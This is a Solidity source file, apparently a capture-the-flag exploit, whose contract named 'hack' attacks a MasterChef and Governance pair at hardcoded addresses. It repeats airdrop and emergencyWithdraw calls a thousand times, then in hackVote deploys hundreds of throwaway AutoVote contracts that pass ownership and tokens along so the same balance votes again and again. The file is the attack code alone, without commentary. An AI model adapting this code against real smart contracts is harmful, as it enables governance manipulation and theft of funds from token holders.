// SPDX-License-Identifier: GPL-3.0-only
pragma solidity 0.6.12;

import "./interface.sol";
import "./Masterchef.sol";
import "./Governance.sol";

contract AutoVote {
    Governance public governance = Governance(0x38De3184D7d755D8cB7AfEBA56b84aCcc87EEECF);
    MasterChef public masterchef = MasterChef(0x10e6c5c4ff31E95F7dEB4047929900DC7f58f6d4);
    function vote() public {
        governance.vote(0x52E810267b3E499D9550B576dD03F3C70245E334);
    }
    function transfervote(address to) public {
        masterchef.transferOwnership(to);
        masterchef.transfer(to,1000000);
    }
}

contract hack {
    using SafeERC20 for IERC20;
    MasterChef public masterchef = MasterChef(0x10e6c5c4ff31E95F7dEB4047929900DC7f58f6d4);
    function airdrop() public {
        for (uint256 i = 0; i < 1000; i++) {
            masterchef.airdorp();
        }
    }
    function deposit() public {
        masterchef.approve(address(masterchef),1000);
        masterchef.deposit(0,1000);
    }
    function hackOwner() public {
        for (uint256 i = 0; i < 1000; i++) {
            masterchef.emergencyWithdraw(0);
        }
        
    }
    function hackVote() public {
        AutoVote lastav;
        for (uint256 i = 0; i < 734; i++) {
            AutoVote av = new AutoVote();
            if(masterchef.balanceOf(address(this))>0){
                masterchef.transferOwnership(address(av));
                masterchef.transfer(address(msg.sender),1000000);
            }else{
                lastav.transfervote(address(av));
            }
            av.vote();
            lastav = av;
        }
        
    }
    
}